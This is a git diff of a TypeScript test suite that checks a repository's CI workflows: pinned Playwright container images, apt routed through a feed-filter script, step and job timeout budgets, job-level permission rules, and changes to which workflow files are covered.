@@ -1,14 +1,5 @@
-import { spawn, spawnSync } from 'node:child_process';
-import {
-    existsSync,
-    mkdirSync,
-    mkdtempSync,
-    readdirSync,
-    readFileSync,
-    rmSync,
-    symlinkSync,
-    writeFileSync,
-} from 'node:fs';
+import { spawnSync } from 'node:child_process';
+import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { delimiter, dirname, join, relative, resolve, sep } from 'node:path';
 
@@ -21,35 +12,22 @@ import {
     requireBrowserWebGpuHardware,
 } from '../../tests/e2e/browserAiHardware';
 import browserAiWebGpuAdmissionConfig from '../../tests/e2e/browserAiWebGpuAdmission.playwright.config';
+import { ADMITTED_CONDITION, assertApprovalGatedRequiredCheck } from '../approvalGatedWorkflowContract';
 import { assertDeployWebBuildRun, assertDeployWebJobNoVercelPull } from '../deployWebWorkflowContract';
 import {
-    assertHostedWasmWorkflow,
     assertWorkflowFileInventory,
     assertWorkflowSnapshotMatch,
     CONDITIONAL_STEP_ALLOWLIST,
     type ConditionalStepPin,
     HEALTH_GATE_WORKFLOW_FILES,
-    JOB_LEVEL_PERMISSION_FREE_FILES,
     parseHealthGateWorkflows,
     readRecordedWorkflowSnapshot,
     SHARD_MATRIX_JOBS,
     STEP_INVENTORY,
 } from '../healthGateWorkflowContract';
 import { assertHostedQuantumMeasurementWorkflow } from '../hostedQuantumMeasurementWorkflowContract';
-import {
-    assertSemanticReviewWorkflow,
-    SEMANTIC_REVIEW_ARTIFACT_ATTEMPT_OUTPUT,
-    SEMANTIC_REVIEW_ASSESS_JOB,
-    SEMANTIC_REVIEW_ASSESS_STEP,
-    SEMANTIC_REVIEW_CHECKOUT_STEP,
-    SEMANTIC_REVIEW_COVERAGE_JOB,
-    SEMANTIC_REVIEW_DOWNLOAD_ARTIFACT_NAME,
-    SEMANTIC_REVIEW_ENV,
-    SEMANTIC_REVIEW_HEAD_EXPRESSION,
-    SEMANTIC_REVIEW_KEY_ENV,
-    SEMANTIC_REVIEW_KEY_SECRET_EXPRESSION,
-    SEMANTIC_REVIEW_UPLOAD_ARTIFACT_NAME,
-} from '../semanticReviewWorkflowContract';
+import { assertHostedWasmWorkflow } from '../hostedWasmWorkflowContract';
+import { assertJobLevelPermissions, assertWorkflowSecuritySurface } from '../workflowSecuritySurfaceContract';
 
 type UnknownRecord = Record<string, unknown>;
 type JobResult = 'cancelled' | 'failure' | 'skipped' | 'success';
@@ -80,44 +58,18 @@ const PULL_REQUEST_PAYLOAD_CONDITION = 'github.event.pull_request != null';
 const SMOKE_CONDITION = `${PULL_REQUEST_PAYLOAD_CONDITION} && needs.decide.outputs.e2e == 'true'`;
 const EVENT_GATED_SMOKE_CONDITION = "github.event_name == 'pull_request' && needs.decide.outputs.e2e == 'true'";
 const SMOKE_COMMAND = 'pnpm test:e2e tests/e2e/smoke.spec.ts --retries=0';
-const BROWSER_INSTALL_ATTEMPTS = 3;
-const ROOT_DEPENDENCY_CAP_MINUTES = 8;
-const USER_BROWSER_CAP_MINUTES = 3;
-const INSTALL_KILL_AFTER_SECONDS = 15;
-// The loop sleeps `attempt * 5` seconds after a failed attempt except the last.
-const INSTALL_BACKOFF_SECONDS = 5 + 10;
-// Apt gets a TERM and a grace period; the browser download is killed outright,
-// because GNU timeout's grace period ends when the direct child exits even if a
-// grandchild survives.
-const ROOT_DEPENDENCY_INSTALL_COMMAND = `sudo env "PATH=$PATH" timeout --kill-after=${INSTALL_KILL_AFTER_SECONDS}s ${ROOT_DEPENDENCY_CAP_MINUTES}m node_modules/.bin/playwright install-deps chromium`;
-const USER_BROWSER_INSTALL_COMMAND = `timeout --signal=KILL ${USER_BROWSER_CAP_MINUTES}m pnpm exec playwright install chromium`;
-// Every attempt times out at its caps, the root half after its kill-after, so a
-// job must hold this plus the time its other steps have been measured to take.
-const BROWSER_INSTALL_WORST_CASE_SECONDS =
-    BROWSER_INSTALL_ATTEMPTS *
-        ((ROOT_DEPENDENCY_CAP_MINUTES + USER_BROWSER_CAP_MINUTES) * 60 + INSTALL_KILL_AFTER_SECONDS) +
-    INSTALL_BACKOFF_SECONDS;
-// What a retry loop ends with once its last attempt has failed: the exit that
-// fails the step. Without it three failed installs fall out of the loop green.
-const BROWSER_INSTALL_FAILING_EXIT = 'if [ "$attempt" -eq 3 ]; then\n    exit 1\n  fi';
+const INSTALL_DRAIN_SECONDS = 15;
+// Every remaining root apt route must retain the signed-source filter.
+const APT_FEED_FILTER = 'bash scripts/aptWithoutMicrosoftFeed.sh';
+const PLAYWRIGHT_IMAGE_DIGEST = 'sha256:eff16c30e6f3f4af0a03fa4b706120d5e9b0891c344a27d64559aff5900a4a27';
+const BROWSER_RUNTIME_STEP = 'Verify preinstalled browser runtime';
 // The ALSA headers are one small apt install, but `apt-get update` is the slow
-// part on a slow mirror, so each attempt carries the same 8 minute root cap as
-// the browser dependency install, and apt gets a TERM before the KILL.
+// part on a slow mirror, so the single transaction carries the same 8 minute
+// manager deadline as the browser dependency install.
 const ALSA_ATTEMPT_CAP_MINUTES = 8;
-const ALSA_INSTALL_COMMAND = `sudo timeout --kill-after=${INSTALL_KILL_AFTER_SECONDS}s ${ALSA_ATTEMPT_CAP_MINUTES}m bash -c 'apt-get update && apt-get install -y libasound2-dev'`;
-// The loop sleeps `attempt * 15` seconds after a failed attempt except the last.
-const ALSA_BACKOFF_SECONDS = 15 + 30;
-const ALSA_INSTALL_WORST_CASE_SECONDS =
-    BROWSER_INSTALL_ATTEMPTS * (ALSA_ATTEMPT_CAP_MINUTES * 60 + INSTALL_KILL_AFTER_SECONDS) + ALSA_BACKOFF_SECONDS;
-// What the ALSA run script ends with: the exit that fails the step.
-const ALSA_FAILING_TAIL = 'done\nexit 1';
-const HEAVY_E2E_INSTALL_STEP_MINUTES = 35;
-// Longest observed time of every step except the browser install, per job.
-const SMOKE_NON_INSTALL_SECONDS = 480;
-const E2E_SHARD_NON_INSTALL_SECONDS = 2040;
-// The derived minimum is a floor only; the declared limit is also a ceiling, so
-// raising a job toward GitHub's 360-minute default (an effectively unbounded
-// job) is a deliberate edit to these constants and not a silent workflow change.
+const FILTERED_ALSA_INSTALL = `${APT_FEED_FILTER} --deadline 8m -- bash -c 'apt-get update && apt-get install -y libasound2-dev'`;
+const ALSA_INSTALL_COMMAND = `sudo env "PATH=$PATH" ${FILTERED_ALSA_INSTALL}`;
+const ALSA_INSTALL_WORST_CASE_SECONDS = ALSA_ATTEMPT_CAP_MINUTES * 60 + INSTALL_DRAIN_SECONDS;
 const SMOKE_JOB_MINUTES = 45;
 const E2E_JOB_MINUTES = 75;
 const PULL_REQUEST_CONCURRENCY_GROUP = 'health-gates-${{ github.event.pull_request.number }}';
@@ -204,7 +156,7 @@ const BROWSER_AI_WEBGPU_COMMAND = 'pnpm test:e2e:browser-ai-webgpu-admission';
 const BROWSER_AI_WEBGPU_LOG = 'browser-ai-webgpu-admission.log';
 const BROWSER_AI_WEBGPU_GLOBAL_TIMEOUT_MS = 17 * 60_000;
 const BROWSER_AI_WEBGPU_STEP_TIMEOUT_MINUTES = 18;
-const BROWSER_AI_WEBGPU_JOB_TIMEOUT_MINUTES = 30;
+const BROWSER_AI_WEBGPU_JOB_TIMEOUT_MINUTES = 40;
 const BROWSER_AI_WEBGPU_DIAGNOSTIC_PATHS = [
     BROWSER_AI_WEBGPU_LOG,
     'test-results/**/trace.zip',
@@ -212,10 +164,13 @@ const BROWSER_AI_WEBGPU_DIAGNOSTIC_PATHS = [
     'test-results/.last-run.json',
 ];
 const BROWSER_AI_WEBGPU_STEP_CAPS = new Map([
-    ['Checkout', 1],
+    // A slow merge-ref fetch timed out a 1-minute checkout (run 39588034702).
+    ['Checkout', 3],
     ['Enable Corepack', 1],
-    ['Set up pnpm', 1],
-    ['Set up Node', 1],
+    // The pnpm self-installer took about 5 minutes on macOS during a registry
+    // slowdown that killed 1-minute admissions (run 39703602835).
+    ['Set up pnpm', 7],
+    ['Set up Node', 3],
     ['Install dependencies', 2],
     ['Install Chromium', 2],
     ['Run Browser AI WebGPU admission', 18],
@@ -231,7 +186,7 @@ const BROWSER_AI_WEBGPU_TEST_MATCH = ['browserAiWebGpuAdmission.spec.ts', 'brows
 const BROWSER_AI_WEBGPU_ORIGIN = 'http://localhost:5188';
 const BROWSER_AI_WEBGPU_SERVER_COMMAND = 'pnpm dev --host 127.0.0.1 --port 5188 --strictPort';
 const BROWSER_AI_WEBGPU_GLOBAL_SETUP = './firstPaintWarmup.ts';
-const GATE_MEMBERS = ['scope', 'validation', 'affected', 'codeql'] as const;
+const GATE_MEMBERS = ['admission', 'scope', 'validation', 'affected', 'codeql'] as const;
 // Exact and ordered. `Gate` is a required status check, so a leg dropped from
 // this lane stops deciding merges while every check still reads green.
 const VALIDATION_JOBS = [
@@ -423,18 +378,11 @@ const PATHS_FILTER_VERDICT_ENV: ReadonlyArray<readonly [string, string]> = [
     ['WEB', 'web'],
     ['UNCLASSIFIED', 'unclassified'],
 ];
-// The two continue-on-errors the lane admits. The first filter attempt defers
-// to the retry that re-runs it, and `Resolve scope` fails the job when neither
-// attempt produced verdicts, so this softening defers to a louder failure
-// rather than swallowing one. The semantic coverage fetch is the second: a
-// missing artifact is the expected shape of a run whose assessment never
-// delivered, and the annotating step reports that absence itself, so softening
-// the fetch replaces a red download with an explicit notice rather than hiding
-// a proof.
+// The first filter attempt defers to the retry; Resolve scope fails when neither
+// attempt produced verdicts, so the softened step does not hide a failure.
 type SoftenedStepPin = Readonly<{ workflow: string; job: string; step: string }>;
 const CONTINUE_ON_ERROR_STEP_PINS: readonly SoftenedStepPin[] = [
     { workflow: 'validation.yml', job: 'decide', step: PATHS_FILTER_FIRST_ATTEMPT_STEP },
-    { workflow: 'semantic-review.yml', job: 'coverage', step: 'Download the advisory report' },
 ];
 // A softened shard step reports a failing suite as a passing required check.
 const SUITE_SHARD_STEP = 'Run shard';
@@ -448,6 +396,10 @@ const DEVICE_WRITE_BOUNDARY_CENSUS_RUN =
 const repositoryRoot = resolve(import.meta.dirname, '../..');
 const parsedPackageManifest: unknown = JSON.parse(readFileSync(join(repositoryRoot, 'package.json'), 'utf8'));
 const packageManifest = asRecord(parsedPackageManifest, 'package manifest');
+const lockfile = asRecord(
+    parseDocument(readFileSync(join(repositoryRoot, 'pnpm-lock.yaml'), 'utf8')).toJS(),
+    'lockfile'
+);
 const browserAiWebGpuConfig = asRecord(browserAiWebGpuAdmissionConfig, 'Browser AI WebGPU config');
 function loadWorkflow(fileName: string): { document: ReturnType<typeof parseDocument>; parsed: UnknownRecord } {
     const document = parseDocument(readFileSync(join(repositoryRoot, '.github/workflows', fileName), 'utf8'));
@@ -461,11 +413,12 @@ const isolationScriptSource = readFileSync(join(repositoryRoot, DEPLOY_WEB_ISOLA
 
 const { document: workflowDocument, parsed: workflow } = loadWorkflow('health-gates.yml');
 const { parsed: validationWorkflow } = loadWorkflow('validation.yml');
+const { parsed: prChecksWorkflow } = loadWorkflow('pr-checks.yml');
 const { parsed: cargoDependencySeed } = loadWorkflow('cargo-dependency-seed.yml');
 const { parsed: heavyWorkflow } = loadWorkflow('heavy-gates.yml');
 const { document: nightlyDocument, parsed: nightly } = loadWorkflow('nightly.yml');
+const { parsed: nightlyEvidenceReporter } = loadWorkflow('nightly-evidence-report.yml');
 const { parsed: hostedQuantumMeasurement } = loadWorkflow('quantum-measurements.yml');
-const { parsed: semanticReviewWorkflow } = loadWorkflow('semantic-review.yml');
 const { parsed: hostedWasm } = loadWorkflow('wasm-artifacts.yml');
 const parsedVercelConfig: unknown = JSON.parse(readFileSync(join(repositoryRoot, 'vercel.json'), 'utf8'));
 const vercelConfig = asRecord(parsedVercelConfig, 'Vercel configuration');
@@ -812,48 +765,53 @@ function assertProseSkippingJobs(candidate: UnknownRecord): void {
         }
     }
     if (jobAt(candidate, 'static').if !== undefined) {
-        throw new Error('release inventory answers to prose changes, so static must stay unconditional');
-    }
-}
-
-function requiredBrowserInstallJobMinutes(nonInstallSeconds: number): number {
-    return Math.ceil((BROWSER_INSTALL_WORST_CASE_SECONDS + nonInstallSeconds) / 60);
-}
-
-// apt-get runs as root through sudo, where a timeout owned by the runner user
-// cannot signal it: the stalled apt would survive as an orphan holding its lock
-// and every later attempt would fail on it. The root half is therefore bounded
-// from the root side, and the user-side browser download separately.
-function assertBoundedBrowserInstall(
-    job: UnknownRecord,
-    label: string,
-    nonInstallSeconds: number,
-    declaredJobMinutes: number
-): void {
-    const installRun = stringAt(stepNamed(job, 'Install Playwright browsers'), 'run');
-    if (!installRun.includes('for attempt in 1 2 3')) {
-        throw new Error(`${label} must retry browser and dependency installation against mirror outages`);
-    }
-    if (installRun.includes('--with-deps')) {
-        throw new Error(`${label} must not install system dependencies through the runner-user browser install`);
-    }
-    if (!installRun.includes(ROOT_DEPENDENCY_INSTALL_COMMAND)) {
-        throw new Error(`${label} must bound the root dependency install from the root side with sudo timeout`);
-    }
-    if (!installRun.includes(USER_BROWSER_INSTALL_COMMAND)) {
-        throw new Error(`${label} must bound the browser download with its own timeout`);
-    }
-    if (!installRun.includes(BROWSER_INSTALL_FAILING_EXIT)) {
-        throw new Error(`${label} must fail the step after the third failed install attempt`);
-    }
-    const timeoutMinutes = job['timeout-minutes'];
-    if (typeof timeoutMinutes !== 'number' || timeoutMinutes < requiredBrowserInstallJobMinutes(nonInstallSeconds)) {
         throw new Error(
-            `${label} must have a job limit that holds three timed-out install attempts and its other steps`
+            'wasm freshness and the script contracts answer to prose-classified changes, so static must stay unconditional'
         );
     }
-    if (timeoutMinutes !== declaredJobMinutes) {
-        throw new Error(`${label} must keep its job limit at exactly ${declaredJobMinutes} minutes`);
+}
+
+function assertContainerBrowserRuntime(job: UnknownRecord, label: string, jobMinutes: number): void {
+    const importer = recordAt(recordAt(lockfile, 'importers'), '.');
+    const version = stringAt(recordAt(recordAt(importer, 'devDependencies'), 'playwright'), 'version');
+    const image = `mcr.microsoft.com/playwright:v${version}-noble@${PLAYWRIGHT_IMAGE_DIGEST}`;
+    if (JSON.stringify(job.container) !== JSON.stringify({ image, options: '--init --ipc=host' })) {
+        throw new Error(`${label} must use the locked Playwright image and digest without extra container authority`);
+    }
+    if (JSON.stringify(job.defaults) !== JSON.stringify({ run: { shell: 'bash' } })) {
+        throw new Error(`${label} must preserve bash in its container`);
+    }
+    if (job['timeout-minutes'] !== jobMinutes) {
+        throw new Error(`${label} must keep its job limit at exactly ${jobMinutes} minutes`);
+    }
+    const proof = stepNamed(job, BROWSER_RUNTIME_STEP);
+    if (proof.run !== `node scripts/verifyPlaywrightRuntime.ts ${version}` || proof['timeout-minutes'] !== 2) {
+        throw new Error(`${label} must launch and check the resolved browser within two minutes`);
+    }
+    const steps = arrayAt(job, 'steps').map((step) => asRecord(step, `${label} step`));
+    for (const step of steps) {
+        if (
+            typeof step.run === 'string' &&
+            /\bapt(?:-get)?\b|playwright\s+install|aptWithoutMicrosoftFeed|hostedAptInstall/.test(step.run)
+        ) {
+            throw new Error(`${label} must not acquire browser packages or binaries at runtime`);
+        }
+        if (step.shell !== undefined && step.shell !== 'bash') {
+            throw new Error(`${label} must preserve bash in its container`);
+        }
+    }
+    const run = stepNamed(job, label === 'the offline smoke job' ? 'Run offline smoke set' : 'Run shard');
+    if (
+        steps.indexOf(proof) !== steps.findIndex((step) => step.name === 'Install dependencies') + 1 ||
+        steps.indexOf(run) !== steps.indexOf(proof) + 1 ||
+        run.if !== undefined ||
+        run['continue-on-error'] !== undefined ||
+        proof.if !== undefined ||
+        proof['continue-on-error'] !== undefined
+    ) {
+        throw new Error(
+            `${label} must prove the runtime before running its browser tests without conditional admission`
+        );
     }
 }
 
@@ -864,22 +822,37 @@ function assertBoundedBrowserInstall(
 function assertBoundedAlsaInstall(job: UnknownRecord, label: string): void {
     const step = stepNamed(job, 'Install ALSA development headers');
     const run = stringAt(step, 'run');
-    if (!run.includes('for attempt in 1 2 3')) {
-        throw new Error(`${label} must retry the ALSA header install against mirror outages`);
+    if (!run.includes(FILTERED_ALSA_INSTALL)) {
+        throw new Error(`${label} must run the ALSA header install through the Microsoft apt feed filter`);
     }
-    if (!run.includes(ALSA_INSTALL_COMMAND)) {
-        throw new Error(`${label} must bound each ALSA install attempt from the root side with sudo timeout`);
-    }
-    if (!run.trimEnd().endsWith(ALSA_FAILING_TAIL)) {
-        throw new Error(`${label} must fail the step after the third failed ALSA install attempt`);
+    if (run !== `set -euo pipefail\n${ALSA_INSTALL_COMMAND}\n`) {
+        throw new Error(`${label} must run one bounded ALSA transaction and propagate its failure`);
     }
     const stepTimeoutMinutes = step['timeout-minutes'];
     if (typeof stepTimeoutMinutes !== 'number' || stepTimeoutMinutes * 60 <= ALSA_INSTALL_WORST_CASE_SECONDS) {
-        throw new Error(`${label} must carry a step limit that holds three timed-out ALSA attempts and backoff`);
+        throw new Error(`${label} must carry a step limit that holds one bounded ALSA transaction`);
     }
     const jobTimeoutMinutes = job['timeout-minutes'];
     if (typeof jobTimeoutMinutes !== 'number' || stepTimeoutMinutes >= jobTimeoutMinutes) {
         throw new Error(`${label} must keep the ALSA step limit below its job limit`);
+    }
+}
+
+function assertLintTimeBudgets(candidate: UnknownRecord): void {
+    const lint = jobAt(candidate, 'lint');
+    const prep = ['Checkout', 'Set up pnpm', 'Set up Node', 'Install dependencies'];
+    for (const name of prep) {
+        if (stepNamed(lint, name)['timeout-minutes'] !== 5) {
+            throw new Error(`lint step ${name} must have a five-minute timeout`);
+        }
+    }
+    if (stepNamed(lint, 'Lint')['timeout-minutes'] !== 20) {
+        throw new Error('lint execution must have a twenty-minute timeout');
+    }
+    const jobTimeout = lint['timeout-minutes'];
+    const stepTotal = prep.length * 5 + 20;
+    if (typeof jobTimeout !== 'number' || jobTimeout < stepTotal + 5 || jobTimeout > 45) {
+        throw new Error('lint job must include five minutes for cleanup after all step budgets');
     }
 }
 
@@ -888,42 +861,14 @@ function assertOfflineSmokeJob(candidate: UnknownRecord): void {
     if (smoke.needs !== 'decide' || smoke.if !== SMOKE_CONDITION) {
         throw new Error('the offline smoke job must run on every pull-request run that touches the browser surface');
     }
-    assertBoundedBrowserInstall(smoke, 'the offline smoke job', SMOKE_NON_INSTALL_SECONDS, SMOKE_JOB_MINUTES);
+    assertContainerBrowserRuntime(smoke, 'the offline smoke job', SMOKE_JOB_MINUTES);
     if (stringAt(stepNamed(smoke, 'Run offline smoke set'), 'run') !== SMOKE_COMMAND) {
         throw new Error('the offline smoke job must run the smoke spec without retries');
     }
 }
 
 function assertBoundedHeavyE2eInstall(candidate: UnknownRecord): void {
-    const e2e = jobAt(candidate, 'e2e');
-    const install = stepNamed(e2e, 'Install Playwright browsers');
-    const run = stringAt(install, 'run');
-    const stepTimeoutMinutes = install['timeout-minutes'];
-    const jobTimeoutMinutes = e2e['timeout-minutes'];
-    if (
-        stepTimeoutMinutes !== HEAVY_E2E_INSTALL_STEP_MINUTES ||
-        typeof jobTimeoutMinutes !== 'number' ||
-        stepTimeoutMinutes >= jobTimeoutMinutes
-    ) {
-        throw new Error('the Playwright install step must be bounded below the E2E job limit');
-    }
-    assertBoundedBrowserInstall(e2e, 'the heavy E2E job', E2E_SHARD_NON_INSTALL_SECONDS, E2E_JOB_MINUTES);
-    if (!run.includes('sleep $((attempt * 5))') || !run.includes('if [ "$attempt" -eq 3 ]; then\n    exit 1')) {
-        throw new Error('the heavy E2E install must retry three bounded attempts and fail after the third');
-    }
-    if (stepTimeoutMinutes * 60 <= BROWSER_INSTALL_WORST_CASE_SECONDS) {
-        throw new Error('the heavy E2E install step limit must leave room for all bounded attempts and backoff');
-    }
-    const steps = arrayAt(e2e, 'steps').map((step) => asRecord(step, 'heavy E2E step'));
-    const installIndex = steps.indexOf(install);
-    const runShard = stepNamed(e2e, 'Run shard');
-    if (
-        steps.indexOf(runShard) !== installIndex + 1 ||
-        runShard.if !== undefined ||
-        runShard['continue-on-error'] !== undefined
-    ) {
-        throw new Error('a failed Playwright install must prevent the heavy E2E shard from running');
-    }
+    assertContainerBrowserRuntime(jobAt(candidate, 'e2e'), 'the heavy E2E job', E2E_JOB_MINUTES);
 }
 
 function assertPullRequestSecretScan(candidate: UnknownRecord): void {
@@ -1460,25 +1405,27 @@ function assertCargoDependencySeed(seed: UnknownRecord, consumer: UnknownRecord)
 
 type WorkflowSet = {
     health: UnknownRecord;
+    prChecks: UnknownRecord;
     validation: UnknownRecord;
     cargoDependencySeed: UnknownRecord;
     heavy: UnknownRecord;
     nightly: UnknownRecord;
+    nightlyEvidenceReporter: UnknownRecord;
     hostedQuantumMeasurement: UnknownRecord;
     hostedWasm: UnknownRecord;
-    semanticReview: UnknownRecord;
 };
 
 function workflowSet(): WorkflowSet {
     return {
         health: workflow,
+        prChecks: prChecksWorkflow,
         validation: validationWorkflow,
         cargoDependencySeed,
         heavy: heavyWorkflow,
         nightly,
+        nightlyEvidenceReporter,
         hostedQuantumMeasurement,
         hostedWasm,
-        semanticReview: semanticReviewWorkflow,
     };
 }
 
@@ -1486,13 +1433,14 @@ function cloneWorkflows(label: string): WorkflowSet {
     const clone = structuredClone(workflowSet());
     return {
         health: asRecord(clone.health, `${label} health`),
+        prChecks: asRecord(clone.prChecks, `${label} PR checks`),
         validation: asRecord(clone.validation, `${label} validation`),
         cargoDependencySeed: asRecord(clone.cargoDependencySeed, `${label} cargo dependency seed`),
         heavy: asRecord(clone.heavy, `${label} heavy`),
         nightly: asRecord(clone.nightly, `${label} nightly`),
+        nightlyEvidenceReporter: asRecord(clone.nightlyEvidenceReporter, `${label} nightly evidence reporter`),
         hostedQuantumMeasurement: asRecord(clone.hostedQuantumMeasurement, `${label} hosted quantum measurement`),
         hostedWasm: asRecord(clone.hostedWasm, `${label} hosted WASM`),
-        semanticReview: asRecord(clone.semanticReview, `${label} semantic review`),
     };
 }
 
@@ -1516,13 +1464,14 @@ function assertBlockingSuites(set: WorkflowSet): void {
 function workflowFiles(set: WorkflowSet): ReadonlyArray<readonly [string, UnknownRecord]> {
     return [
         ['health-gates.yml', set.health],
+        ['pr-checks.yml', set.prChecks],
         ['validation.yml', set.validation],
         ['cargo-dependency-seed.yml', set.cargoDependencySeed],
         ['heavy-gates.yml', set.heavy],
         ['nightly.yml', set.nightly],
+        ['nightly-evidence-report.yml', set.nightlyEvidenceReporter],
         ['quantum-measurements.yml', set.hostedQuantumMeasurement],
         ['wasm-artifacts.yml', set.hostedWasm],
-        ['semantic-review.yml', set.semanticReview],
     ];
 }
 
@@ -1530,6 +1479,32 @@ function jobSteps(file: string, jobId: string, job: UnknownRecord): UnknownRecor
     return job.steps === undefined
         ? []
         : arrayAt(job, 'steps').map((step) => asRecord(step, `${file} job ${jobId} step`));
+}
+
+// Commands that run apt on a hosted runner: apt itself, Playwright's system
+// dependency install, and its Chrome channel install script.
+const APT_COMMAND =
+    /\bapt-get\b|\bapt\s+(?:update|install)\b|playwright install-deps|--with-deps|playwright install --force chrome/;
+
+// A new or edited apt route that skips the filter fails on the next Microsoft
+// feed 403 (#5359), so every apt-invoking command line must carry it.
+function assertAptRoutesFiltered(set: WorkflowSet): void {
+    for (const [file, parsed] of workflowFiles(set)) {
+        for (const [jobId, job] of Object.entries(recordAt(parsed, 'jobs'))) {
+            for (const step of jobSteps(file, jobId, asRecord(job, `${file} job ${jobId}`))) {
+                if (typeof step.run !== 'string') {
+                    continue;
+                }
+                for (const line of step.run.split('\n')) {
+                    if (APT_COMMAND.test(line) && !line.includes(APT_FEED_FILTER)) {
+                        throw new Error(
+                            `${file} job ${jobId} step ${String(step.name)} must run apt through the Microsoft apt feed filter`
+                        );
+                    }
+                }
+            }
+        }
+    }
 }
 
 function stepLabel(file: string, jobId: string, step: UnknownRecord): string {
@@ -1626,19 +1601,10 @@ function assertShardMatrices(set: WorkflowSet): void {
 }
 
 // A job-level `permissions` block reshapes one leg's token away from the
-// workflow-level pin the permission assertions verify, and no pin read it:
-// `contents: write` on a validation leg would hand every pull request a token
-// that can push. The heavy and nightly files keep their own exact job-level
-// pins (CodeQL, the nightly reporter); these two files must grant nothing.
+// workflow-level pin: `contents: write` on a validation leg would hand every
+// pull request a token that can push.
 function assertNoJobLevelPermissions(set: WorkflowSet): void {
-    for (const file of JOB_LEVEL_PERMISSION_FREE_FILES) {
-        for (const [jobId, jobValue] of Object.entries(recordAt(workflowByFile(set, file), 'jobs'))) {
-            const job = asRecord(jobValue, `${file} job ${jobId}`);
-            if (job.permissions !== undefined) {
-                throw new Error(`${file} job ${jobId} must inherit the workflow-level permissions`);
-            }
-        }
-    }
+    assertJobLevelPermissions(Object.fromEntries(workflowFiles(set)));
 }
 
 // A deleted step fails nothing: the job goes green having never run the
@@ -1737,24 +1703,11 @@ function assertValidationScopeConditions(candidate: UnknownRecord): void {
 
 // The single invariant the whole split exists to hold: `Gate` is the required
 // context, GitHub counts a `skipped` conclusion as satisfying a required check,
-// and it prefers the newest run of that name. So only a `pull_request` run of
-// `health-gates.yml` may mint that name, and `gate` must be unable to skip.
+// and it prefers the newest run of that name. So only a labeled `pull_request`
+// run of `health-gates.yml` may mint that name, `gate` must be unable to skip,
+// and it must fail unless the reviewer App approved the exact head.
 function assertRequiredCheckIsolation(set: WorkflowSet): void {
-    if (JSON.stringify(Object.keys(recordAt(set.health, 'on'))) !== JSON.stringify([...HEALTH_GATES_TRIGGERS])) {
-        throw new Error(
-            'health-gates.yml must answer to pull_request alone, or a skipped Gate can satisfy the required check'
-        );
-    }
-    if (jobAt(set.health, 'gate').if !== GATE_CONDITION) {
-        throw new Error('Gate must run after cancellation');
-    }
-    for (const [file, candidate] of workflowFiles(set).filter(([file]) => file !== 'health-gates.yml')) {
-        for (const [id, job] of Object.entries(recordAt(candidate, 'jobs'))) {
-            if (jobCheckName(id, job) === REQUIRED_CHECK_NAME) {
-                throw new Error(`${file} must not name a job ${REQUIRED_CHECK_NAME}`);
-            }
-        }
-    }
+    assertApprovalGatedRequiredCheck(Object.fromEntries(workflowFiles(set)));
     if (JSON.stringify(Object.keys(recordAt(set.heavy, 'on')).sort()) !== JSON.stringify([...HEAVY_GATES_TRIGGERS])) {
         throw new Error('heavy-gates.yml must be reusable-only');
     }
@@ -1831,6 +1784,18 @@ function assertJobGraph(set: WorkflowSet): void {
     assertNightlyReportCoverage(set);
     assertDeviceWriteBoundaryCensus(set);
     assertSummaryMembership(set);
+    assertRequiredScopePlan(set.prChecks);
+    if (JSON.stringify(Object.keys(recordAt(set.prChecks, 'jobs'))) !== JSON.stringify(['scope', 'validation'])) {
+        throw new Error('pr-checks.yml must run only the scope plan and the validation lane');
+    }
+    const pushValidation = jobAt(set.prChecks, 'validation');
+    if (
+        pushValidation.uses !== VALIDATION_CALL ||
+        pushValidation.needs !== 'scope' ||
+        JSON.stringify(pushValidation.with) !== JSON.stringify(recordAt(jobAt(set.health, 'validation'), 'with'))
+    ) {
+        throw new Error('push validation must consume the affected scope exactly as the required lane does');
+    }
 }
 
 // Both trains run the census once, in their static contract job, and a
@@ -1919,6 +1884,14 @@ function assertSummaryMembership(set: WorkflowSet): void {
 }
 
 function assertUnitProvenanceHistory(candidate: UnknownRecord): void {
+    const staticCheckout = stepNamed(jobAt(candidate, 'static'), 'Checkout');
+    const staticOptions = recordAt(staticCheckout, 'with');
+    if (staticOptions['fetch-depth'] !== 0) {
+        throw new Error('static must retain complete history for release inventory provenance');
+    }
+    if (staticOptions.ref !== '${{ github.sha }}') {
+        throw new Error('static release inventory must inspect the current workflow revision');
+    }
     const unitCheckout = stepNamed(jobAt(candidate, 'unit'), 'Checkout');
     if (recordAt(unitCheckout, 'with')['fetch-depth'] !== 0) {
         throw new Error('unit must retain complete history for immutable measurement provenance');
@@ -1932,6 +1905,21 @@ function assertUnitProvenanceHistory(candidate: UnknownRecord): void {
         ) {
             throw new Error(`${jobName} must not fetch complete history`);
         }
+    }
+}
+
+function assertReleaseInventoryCommand(job: UnknownRecord): void {
+    if (stepNamed(job, 'Release inventory').run !== 'pnpm test:release-inventory') {
+        throw new Error('release inventory must run its exact validation command');
+    }
+}
+
+function assertCampaignFixtureCommand(job: UnknownRecord): void {
+    if (
+        stepNamed(job, 'Campaign fixture freshness').run !==
+        "pnpm test:run scripts/__tests__/agentCampaignHarness.spec.ts -t 'records each fixture as the tree actually holds it' --maxWorkers=2"
+    ) {
+        throw new Error('campaign fixture freshness must run its exact validation case');
     }
 }
 
@@ -1977,7 +1965,9 @@ function assertBrowserAiWebGpuJob(candidate: UnknownRecord): void {
         throw new Error('Browser AI WebGPU job must use the standard macos-14 runner');
     }
     if (job['timeout-minutes'] !== BROWSER_AI_WEBGPU_JOB_TIMEOUT_MINUTES) {
-        throw new Error('Browser AI WebGPU job must retain its 30-minute failure limit');
+        throw new Error(
+            `Browser AI WebGPU job must retain its ${BROWSER_AI_WEBGPU_JOB_TIMEOUT_MINUTES}-minute failure limit`
+        );
     }
     if (stringAt(stepNamed(job, 'Install Chromium'), 'run') !== 'pnpm exec playwright install chromium') {
         throw new Error('Browser AI WebGPU job must install Chromium directly');
@@ -2386,52 +2376,6 @@ function assertCredentiallessScanner(candidate: UnknownRecord): void {
     }
 }
 
-/**
- * Runs the workflow's own computing and annotating commands against a report written into a
- * throwaway runner temp. The shipped scripts are what is observed, so the coverage line's tally, the
- * notices, and each absence branch are read back rather than restated, and a report the scripts
- * mishandle is a failure here rather than a claim in a comment. Omitting `report` writes none; an
- * empty `report` writes a zero-byte one; `downloadOutcome` and `coverageLine` select the branch.
- */
-function runSemanticCoverageLine(options: { report?: string; downloadOutcome?: string; coverageLine?: string }): {
-    coverage: string;
-    notices: string;
-    status: number | null;
-} {
